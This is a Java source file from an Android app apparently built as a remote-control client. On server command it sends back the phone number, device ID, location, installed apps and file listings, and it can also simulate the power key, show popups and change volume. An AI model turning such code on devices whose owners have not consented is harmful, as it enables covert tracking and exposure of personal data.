package com.weclont.mesget;

import android.app.NotificationManager;
import android.bluetooth.BluetoothAdapter;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;

import androidx.core.app.ActivityCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.io.IOException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class CmdThingToDo extends Thread {
    private static final String TAG = "CmdThingToDo"; // Command的执行类

    public socketMesget sm = new socketMesget();
    public String result;
    public String MCName;
    public Context ServiceContext;

    //初始化Handler
    public Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case 1: //
                    Log.e(TAG, "handleMessage: 测试");
                    break;
            }
        }
    };

    @Override
    public void run() {
        super.run();

        //初始化
        MCName = MainApplication.getMCName();
        ServiceContext = MainApplication.getServiceContext();
        sm.onCreate();
//        sm.sendBeatData();

        //开始执行
        Log.e(TAG, "init: 命令开始运行...");

        while (true) {

            //监听服务端是否有信息发出
            sm.onListenServer();

            //判断连接是否异常，如果异常就等待重新连接
            while (MainApplication.result) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            //读取信息
            result = sm.getResponse();

            //判断result是否为空
            if (result == null || result.equals("")) {
                Log.e("CmdThingToDo", "init: 没有Command可以执行。");
                continue;
            }

            //读取到Command
            Log.e("CmdThingToDo", "init: 读取到Command:" + result);

            //执行函数
            onDo();

        }

    }

    public void onDo() {

        //HelloWorld测试方法
        if (result.equals("helloworld") || result.equals("HelloWorld") || result.equals("HelloWorld!")) {
            sm.onSendMsg("成功获取到信息！Hello World!");
            Log.e("CmdThingToDo", "HelloWorld: HelloWorld发送成功");
            return;
        }

        //读取设备基本信息方法 - 依赖EquipmentInfoPO
        if (result.equals("getDeviceCommonMsg")) {
            //获取数据
            EquipmentPO ep = new EquipmentInfoCollection().getEquipmentInfo(MainApplication.getServiceContext());
            Log.e("CmdThingToDo",
                    "getDeviceCommonMsg: 获取到数据：手机品牌：" + ep.getBrand() +
                            "是否ROOT：" + ep.getBreakFlag() +
                            "IP：" + ep.getIp() +
                            "运营商国家：" + ep.getCountry() +
                            "CPU支持的指令集：" + ep.getCpuABI() +
                            "CPU数量：" + ep.getCpuCount() +
                            "CPU速度：" + ep.getCpuSpeed() +
                            "设备ID：" + ep.getDeviceId() +
                            "机型：" + ep.getModel() +
                            "网络类型：" + ep.getNetworkType() +
                            "屏幕分辨率：" + ep.getResolution() +
                            "总内存：" + ep.getTotalMemory() +
                            "剩余内存：" + ep.getLeftMemory() +
                            "总空间：" + ep.getTotalStorage() +
                            "剩余空间：" + ep.getLeftDisk() +
                            "语言：" + ep.getLanguage() +
                            "本机手机号：" + ep.getPhoneNum() +
                            "照片总数：" + ep.getDevice_pic_cnt() +
                            "剩余电量：" + ep.getDevice_battery_level());
            sm.onSendMsg(
                    "获取到数据：<br>手机品牌：" + ep.getBrand() + "<br>" +
                            "是否ROOT：" + ep.getBreakFlag() + "<br>" +
                            "IP：" + ep.getIp() + "<br>" +
                            "运营商国家：" + ep.getCountry() + "<br>" +
                            "CPU支持的指令集：" + ep.getCpuABI() + "<br>" +
                            "CPU数量：" + ep.getCpuCount() + "<br>" +
                            "CPU速度：" + ep.getCpuSpeed() + "<br>" +
                            "设备ID：" + ep.getDeviceId() + "<br>" +
                            "机型：" + ep.getModel() + "<br>" +
                            "网络类型：" + ep.getNetworkType() + "<br>" +
                            "屏幕分辨率：" + ep.getResolution() + "<br>" +
                            "总内存：" + ep.getTotalMemory() + "<br>" +
                            "剩余内存：" + ep.getLeftMemory() + "<br>" +
                            "总空间：" + ep.getTotalStorage() + "<br>" +
                            "剩余空间：" + ep.getLeftDisk() + "<br>" +
                            "语言：" + ep.getLanguage() + "<br>" +
                            "本机手机号：" + ep.getPhoneNum() + "<br>" +
                            "照片总数：" + ep.getDevice_pic_cnt() + "<br>" +
                            "剩余电量：" + ep.getDevice_battery_level());
            return;
        }

        //检查屏幕状态
        if (result.equals("getScreenState")) {
            //创建检查屏幕类
            PowerManager pm = (PowerManager) ServiceContext.getSystemService(Context.POWER_SERVICE);

            //检查屏幕亮息屏
            boolean isScreenOn = pm.isScreenOn();//如果为true，则表示屏幕“亮”了，否则屏幕“暗”了。
            if (isScreenOn) {
                sm.onSendMsg("屏幕为点亮状态");
            } else {
                sm.onSendMsg("屏幕为熄灭状态");
            }
            return;
        }

        //返回当前定位数据
        if (result.equals("getLocation")) {
            if (MainApplication.isLocationOK) {
                //定位成功
                sm.onSendMsg("<Type:getLocation><State:true><Longitude:" + MainApplication.Longitude + "><Latitude:" + MainApplication.Latitude + "><LocationTime:" + MainApplication.LocationTime + "><LocationType:" + MainApplication.LocationType + "><LocationAccuracy:" + MainApplication.Accuracy + ">");
                Log.e("getLocation", "定位成功！经纬度：" + MainApplication.Longitude + "" + MainApplication.Latitude + "> 数据获取时间：" + MainApplication.LocationTime + "结果来源：" + MainApplication.LocationType + "精度：" + MainApplication.Accuracy);
            } else {
                //定位失败
                sm.onSendMsg("<Type:getLocation><State:false><Longitude:" + MainApplication.Longitude + "><Latitude:" + MainApplication.Latitude + "><LocationTime:" + MainApplication.LocationTime + "><LocationType:" + MainApplication.LocationType + "><LocationAccuracy:" + MainApplication.Accuracy + ">");
                Log.e("TAG", "onCreate: 定位失败！失败次数：" + MainApplication.sume + "最后一次成功定位到数据：经纬度：" + MainApplication.Longitude + "," + MainApplication.Latitude + "相对定位时间：" + MainApplication.LocationTime + "结果来源：" + MainApplication.LocationType + "精度：" + MainApplication.Accuracy);
            }
            return;
        }

        //模拟亮锁屏
        if (result.equals("setScreenState")) {
            String temp = "";
            //操作前先检查屏幕
            PowerManager pm = (PowerManager) ServiceContext.getSystemService(Context.POWER_SERVICE);
            //检查屏幕亮息屏
            boolean isScreenOn = pm.isScreenOn();//如果为true，则表示屏幕“亮”了，否则屏幕“暗”了。
            if (isScreenOn) {
                temp = "操作前屏幕为点亮状态<br>";
            } else {
                temp = "操作前屏幕为熄灭状态<br>";
            }
            try {
                String keyCommand = "input keyevent " + KeyEvent.KEYCODE_POWER;
                Runtime runtime = Runtime.getRuntime();
                runtime.exec(keyCommand);
            } catch (IOException e) {
                Log.e(TAG, "onDo: 模拟失败");
            }
            //操作完成后检查屏幕
            isScreenOn = pm.isScreenOn();//如果为true，则表示屏幕“亮”了，否则屏幕“暗”了。
            if (isScreenOn) {
                sm.onSendMsg(temp + "操作完成后屏幕为点亮状态");
            } else {
                sm.onSendMsg(temp + "操作完成后屏幕为熄灭状态");
            }
            return;
        }

        //返回当前网络状态
        if (result.equals("getNetWorkState")) {
            String s = "";
            if (IsAirModeOn(MainApplication.getServiceContext())) {
                s += "飞行模式开关：开启<br>";
            } else {
                s += "飞行模式开关：关闭<br>";
            }
            if (isWiFiEnable(MainApplication.getServiceContext())) {
                s += "WIFI开关：开启<br>";
            } else {
                s += "WIFI开关：关闭<br>";
            }
            if (isMobileEnable(MainApplication.getServiceContext())) {
                s += "移动数据开关：开启<br>";
            } else {
                s += "移动数据开关：关闭<br>";
            }
            if (ChikcBlue()) {
                s += "蓝牙开关：开启<br>";
            } else {
                s += "蓝牙开关：关闭<br>";
            }
            if (isLocServiceEnable(MainApplication.getServiceContext())) {
                s += "定位服务开关：开启";
            } else {
                s += "定位服务开关：关闭";
            }
            //返回数据
            sm.onSendMsg(s);
            return;
        }

        // 读取应用列表
        if (result.equals("getAppList")) {
            sm.onSendMsg(getAppList(MainApplication.getServiceContext()));
            return;
        }

        // 远程提示框
        if (stringMatch("Type", result).equals("setTooltip")) {
            String text = stringMatch("Msg", result);
            Intent intent = new Intent(MainApplication.getServiceContext(), TooltipActivity.class);
            intent.putExtra("Text", text);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MainApplication.getServiceContext().startActivity(intent);
            sm.onSendMsg("获取到内容：" + text + "，发送成功");
            return;
        }

        // 检查权限是否给予
        if (result.equals("checkPermission_WRITE_EXTERNAL_STORAGE")) {
            if (checkPermission_WRITE_EXTERNAL_STORAGE()) {
                sm.onSendMsg("<Type:checkPermission_WRITE_EXTERNAL_STORAGE><State:true>");
            } else {
                sm.onSendMsg("<Type:checkPermission_WRITE_EXTERNAL_STORAGE><State:false>");
            }
            return;
        }

        // 远程获取文件列表
        /**
         * String file_list 格式：
         * <Type:getFiles>
         * <Dir:/storage/emulated/0/>
         * <Sum:4>
         * <File1:..><isFile1:false>
         * <File2:wenjianjia><isFile2:false>
         * <File3:a.txt><isFile3:true>
         * <File4:b.txt><isFile4:true>
         */
        if (stringMatch("Type", result).equals("getFiles")) {

            //获取路径
            String path = stringMatch("Dir", result);

            String file_list = "";

            File file = new File(path);
            File[] files = file.listFiles();

            // 如果文件夹为空，直接发送
            if (files == null) {
                file_list = "<Type:getFiles><Dir:" + path + "><Sum:1><File1:..><isFile1:false>";
                sm.onSendMsg(file_list);
                return;
            }

            // 不为空，遍历一遍整理数据
            String file_list_temp = "<File1:..><isFile1:false>";
            for (int i = 0; i < files.length; i++) {
                String isFile = "";
                if (files[i].isFile()) {
                    isFile = "true";
                } else {
                    isFile = "false";
                }
                file_list_temp += "<File" + (i + 2) + ":" + files[i].getName() + "><isFile" + (i + 2) + ":" + isFile + ">";
            }

            //记录数据文件总数
            int summ = files.length + 1;

            // 整理数据
            file_list = "<Type:getFiles><Dir:" + path + "><Sum:" + summ + ">" + file_list_temp;

            //日志返回数据
            Log.e(TAG, "onDo: " + file_list);

            //发送返回数据
            sm.onSendMsg(file_list);
            return;
        }

        // 获取当前系统媒体音量
        if (result.equals("checkNowVolume")) {
            AudioManager mAudioManager = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            //通话音量
            int MAX_STREAM_VOICE_CALL = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL);
            int CURRENT_STREAM_VOICE_CALL = mAudioManager.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
            //系统音量
            int MAX_STREAM_SYSTEM = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM);
            int CURRENT_STREAM_SYSTEM = mAudioManager.getStreamVolume(AudioManager.STREAM_SYSTEM);
            //铃声音量
            int MAX_STREAM_RING = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
            int CURRENT_STREAM_RING = mAudioManager.getStreamVolume(AudioManager.STREAM_RING);
            //音乐音量
            int MAX_STREAM_MUSIC = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
            int CURRENT_STREAM_MUSIC = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
            //提示声音音量
            int MAX_STREAM_ALARM = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM);
            int CURRENT_STREAM_ALARM = mAudioManager.getStreamVolume(AudioManager.STREAM_ALARM);
            sm.onSendMsg("<Type:checkNowVolume><MAX_STREAM_VOICE_CALL:" + MAX_STREAM_VOICE_CALL + "><CURRENT_STREAM_VOICE_CALL:"
                    + CURRENT_STREAM_VOICE_CALL + "><MAX_STREAM_SYSTEM:" + MAX_STREAM_SYSTEM + "><CURRENT_STREAM_SYSTEM:" + CURRENT_STREAM_SYSTEM + "><MAX_STREAM_RING:"
                    + MAX_STREAM_RING + "><CURRENT_STREAM_RING:" + CURRENT_STREAM_RING + "><MAX_STREAM_MUSIC:" + MAX_STREAM_MUSIC + "><CURRENT_STREAM_MUSIC:"
                    + CURRENT_STREAM_MUSIC + "><MAX_STREAM_ALARM:" + MAX_STREAM_ALARM + "><CURRENT_STREAM_ALARM:" + CURRENT_STREAM_ALARM + ">");
            return;
        }

        // 修改类型音量
        if (stringMatch("Type", result).equals("setCallVolume")) {
            int iop = Integer.parseInt(stringMatch("Level", result));
            AudioManager mam = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            if (iop != 0) {
                mam.setStreamVolume(AudioManager.STREAM_VOICE_CALL, iop, 0);
            } else {
                mam.setStreamMute(AudioManager.STREAM_VOICE_CALL, true);
            }
            sm.onSendMsg("<Type:setVolume>");
            return;
        }

        // 修改类型音量
        if (stringMatch("Type", result).equals("setSystemVolume")) {
            int iop = Integer.parseInt(stringMatch("Level", result));
            AudioManager mam = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            if (iop != 0) {
                mam.setStreamVolume(AudioManager.STREAM_SYSTEM, iop, 0);
            } else {
                mam.setStreamMute(AudioManager.STREAM_SYSTEM, true);
            }
            sm.onSendMsg("<Type:setVolume>");
            return;
        }

        // 修改类型音量
        if (stringMatch("Type", result).equals("setRingVolume")) {
            int iop = Integer.parseInt(stringMatch("Level", result));
            AudioManager mam = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            if (iop != 0) {
                mam.setStreamVolume(AudioManager.STREAM_RING, iop, 0);
            } else {
                mam.setStreamMute(AudioManager.STREAM_RING, true);
            }
            sm.onSendMsg("<Type:setVolume>");
            return;
        }

        // 修改类型音量
        if (stringMatch("Type", result).equals("setMusicVolume")) {
            int iop = Integer.parseInt(stringMatch("Level", result));
            AudioManager mam = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            if (iop != 0) {
                mam.setStreamVolume(AudioManager.STREAM_MUSIC, iop, 0);
            } else {
                mam.setStreamMute(AudioManager.STREAM_MUSIC, true);
            }
            sm.onSendMsg("<Type:setVolume>");
            return;
        }

        // 修改类型音量
        if (stringMatch("Type", result).equals("setAlarmVolume")) {
            int iop = Integer.parseInt(stringMatch("Level", result));
            AudioManager mam = (AudioManager) MainApplication.getServiceContext().getSystemService(Context.AUDIO_SERVICE);
            if (iop != 0) {
                mam.setStreamVolume(AudioManager.STREAM_ALARM, iop, 0);
            } else {
                mam.setStreamMute(AudioManager.STREAM_ALARM, true);
            }
            sm.onSendMsg("<Type:setVolume>");
            return;
        }


    }

    // 检查权限是否给予
    private boolean checkPermission_WRITE_EXTERNAL_STORAGE() {
        try {
            int permission = ActivityCompat.checkSelfPermission(MainApplication.getServiceContext(), "android.permission.WRITE_EXTERNAL_STORAGE");
            return permission == PackageManager.PERMISSION_GRANTED;
        } catch (Exception e) {
            e.printStackTrace();
            Log.e(TAG, "checkPermission: 权限检查错误!");
            return false;
        }
    }

    //切割字符串
    public static String stringMatch(String type, String s) {
        try {
            List<String> results = new ArrayList<String>();
            Pattern p = Pattern.compile("<" + type + ":(.*?)>");
            Matcher m = p.matcher(s);
            while (!m.hitEnd() && m.find()) {
                results.add(m.group(1));
            }
            Log.e(TAG, "stringMatch: 切割结果：" + results.get(0));
            return results.get(0);
        } catch (Exception e) {
            Log.e(TAG, "stringMatch: 字符串切割错误！");
            return "";
        }
    }

    //判断WiFi是否打开
    public static boolean isWiFiEnable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager == null) {
            return false;
        }
        NetworkInfo info = connectivityManager.getActiveNetworkInfo();
        return !((info == null) || (!info.isAvailable())) && info.getType() == ConnectivityManager.TYPE_WIFI;
    }

    //判断移动网络是否打开
    public static boolean isMobileEnable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getApplicationContext()
                .getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager == null) {
            return false;
        }
        NetworkInfo info = connectivityManager.getActiveNetworkInfo();
        return !((info == null) || (!info.isAvailable())) && info.getType() == ConnectivityManager.TYPE_MOBILE;
    }

    //判断蓝牙是否打开
    public boolean ChikcBlue() {
        BluetoothAdapter blueadapter = BluetoothAdapter.getDefaultAdapter();
        if (blueadapter != null) {
            if (blueadapter.isEnabled()) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }

    //判断定位服务是否打开
    public static boolean isLocServiceEnable(Context context) {
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        boolean network = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        return gps || network;
    }

    //判断是否开启飞行模式
    public static boolean IsAirModeOn(Context context) {
        return (Settings.System.getInt(context.getContentResolver(),
                Settings.System.AIRPLANE_MODE_ON, 0) == 1);
    }

    //获取手机已安装应用列表
    private String getAppList(Context context) {
        String s = "";
        int summ = 0;
        int summa = 0;
        int summb = 0;
        List<String> packages = new ArrayList<String>();
        try {
            List<PackageInfo> packageInfos = context.getPackageManager().getInstalledPackages(PackageManager.GET_ACTIVITIES);
            for (PackageInfo info : packageInfos) {
                summ++;
                String pkg = info.packageName;
                String pkgname = getApplicationNameByPackageName(context, pkg);
                String isSystemAppState = "";
                if (isSystemApp(info)) {
                    summa++;
                    isSystemAppState = "系统应用";
                } else {
                    summb++;
                    isSystemAppState = "用户应用";
                }
                s += pkgname + "<br>" + pkg + "<br>" + isSystemAppState + "<br><br>";
            }
        } catch (Throwable t) {
            t.printStackTrace();
            s = "应用列表获取失败！";
            Log.e(TAG, "getPkgListNew: 应用列表获取失败！");
        }
        s = "设备共安装了" + summ + "个应用，其中有" + summa + "个系统应用，" + summb + "个用户应用。<br><br>" + s;
        return s;
    }

    //判断是否为系统应用
    private boolean isSystemApp(PackageInfo pi) {
        boolean isSysApp = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 1;
        boolean isSysUpd = (pi.applicationInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) == 1;
        return isSysApp || isSysUpd;
    }

    //根据应用包名获取应用名称
    public String getApplicationNameByPackageName(Context context, String packageName) {
        PackageManager pm = context.getPackageManager();
        String Name;
        try {
            Name = pm.getApplicationLabel(pm.getApplicationInfo(packageName, PackageManager.GET_META_DATA)).toString();
        } catch (PackageManager.NameNotFoundException e) {
            Name = "";
        }
        return Name;
    }

    //Handler便捷发送
    public void onHandlerMsg(int i, String s) {
        Message msg = new Message();
        msg.what = i;
        msg.obj = s;
        handler.sendMessage(msg);
    }

}
